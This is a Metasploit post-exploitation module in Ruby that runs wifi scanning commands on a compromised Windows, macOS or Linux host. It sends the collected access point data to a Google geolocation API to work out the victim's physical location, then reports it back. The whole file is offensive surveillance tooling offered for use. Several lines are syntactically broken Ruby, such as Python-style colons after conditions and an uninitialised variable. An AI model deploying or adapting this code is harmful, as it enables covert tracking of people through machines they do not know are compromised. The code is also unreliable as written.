require 'msf/core'
require 'rex/proto/http/client'

class Metasploit3 < Msf::Post
	
	include Msf::Auxiliary::Badger_Report
	#include Msf::Post::Common

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'WLAN Geolocation Using Google API',
			'Description'   => %q{
				This module does some neat shit. Thanks to Tim.
			},
			'License'       => MSF_LICENSE,
			'Author'        => ['v10l3nt'],
			'Version'       => '$Revision$',
			'Platform'      => [ 'windows', 'linux', 'osx'],
			'SessionTypes'  => [ 'meterpreter', 'shell' ]
		))
	end

	def wlan_survey()
		survey = ""
		print_status("Surveying Wireless Networks")
		case session.platform
		when /osx/
			wdata= session.shell_command("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s")
			print_status(wdata)
			wdata.each do |line|
			if (line =~ /((?:[0-9a-f]{2}[:-]){5}[0-9a-f]{2})/i)
				mac = $1
				idx=line.index(mac)-1
				ssid=line[0..idx].gsub!(/\s+/, "")
				rssi=line[idx+19..idx+22].gsub!(/\s+/, "") ## cleanup --> ugly
				survey << "&wifi=mac:#{mac}%7Cssid:#{ssid}%7Css:#{rssi}"
			end
		end
            
		when /win/

            # Check to make sure it is running against either Vista|7|8|2008
            winver = session.sys.config.sysinfo["OS"]
			affected = [ 'Windows Vista', 'Windows 7', 'Windows 2008', 'Windows 8' ]
            vuln = false
            affected.each { |v|
                if winver.include? v
                    vuln = true
                end
            }
            if not vuln
                print_error("Module does not work with #{winver}.")
                return
            end
            
            cmd = "netsh wlan show networks mode=bssid | findstr \"SSID Signal\""
            if session.type =~ /shell/
                wdata << cmd_exec(cmd.chomp)
            elsif session.type =~ /meterpreter/
                wdata=session.shell_command(cmd)
            end
            print_status("#{wdata}")
            mac,rssi,ssid=nil
            wdata.each do |line|
                if (line.include? 'BSSID'):
                    mac = line.slice(line.index(':')+1,line.length).gsub!(/\s+/, "")
                elsif (line.include? 'SSID'):
                        ssid = line.slice(line.index(':')+1,line.length).gsub!(/\s+/, "")
                elsif (line =~ /([0-9]*%)/i)
                    rssi = $1.gsub!("\%","")
                    rssi = rssi.to_i * -1
				end
				if (mac and ssid and rssi)
					survey << "&wifi=mac:#{mac}%7Cssid:#{ssid}%7Css:#{rssi}"
                    mac, ssid, rssi=nil
				end
            end
            
		when /linux/
            cmd = "/sbin/iwlist wlan0 scan | egrep 'Address|ESSID|Signal'"
			if session.type =~ /shell/
				wdata= session.shell_command(cmd)
			elsif session.type =~ /meterpreter/
				wdata=cmd_exec(cmd)
			end
			print_status("#{wdata}")
			mac,rssi,ssid=nil
			wdata.each do |line|
				if (line =~ /((?:[0-9a-f]{2}[:-]){5}[0-9a-f]{2})/i)
					mac = $1
				elsif (line =~ /(-[0-9]* dBm)/i)
					rssi = $1.chomp(" dBm")
				elsif (line.include? 'ESSID'):
					ssid=line.gsub!("ESSID:", "").gsub!("\"","").gsub!(/\s+/, "")
				end
				if (mac and rssi and ssid)
					survey << "&wifi=mac:#{mac}%7Cssid:#{ssid}%7Css:#{rssi}"
					mac,rssi,ssid=nil
				end
		end
		
		else
			print_error "Unsupported platform #{session.platform}"
			return
		end
		return survey
end

	def wlan_triangulate(survey)
		c = Rex::Proto::Http::Client.new("maps.googleapis.com",443,{},true)
		uri = "/maps/api/browserlocation/json?browser=firefox&sensor=true#{survey}"
		r = c.request_raw('uri'=>uri)
		resp=c.send_recv(r)
		res=resp.body

		if res =~ /(accuracy(.)+.,)/
			acc = $1.sub("accuracy\" :","").chomp(",").gsub!(/\s+/, "")
		end
		if res =~ /(lat(.)+.,)/
			lat = $1.sub("lat\" :","").chomp(",").gsub!(/\s+/, "")
		end

		if res =~ /(lng(.)+.)/
			lon = $1.sub("lng\" :","").gsub!(/\s+/, "")
		end
		pos = Position.new(lat,lon,acc)
		print_status("Google Triangulated Position:  lat: #{pos.lat}, lon: #{pos.lon}, acc: #{pos.acc}")
		return pos
	end

	def run
		survey = wlan_survey()
		pos = wlan_triangulate(survey)
        comment = "Geolocated with survey: #{survey}"
		report_results(pos,"msf_wlansurvey",comment)
	end

end
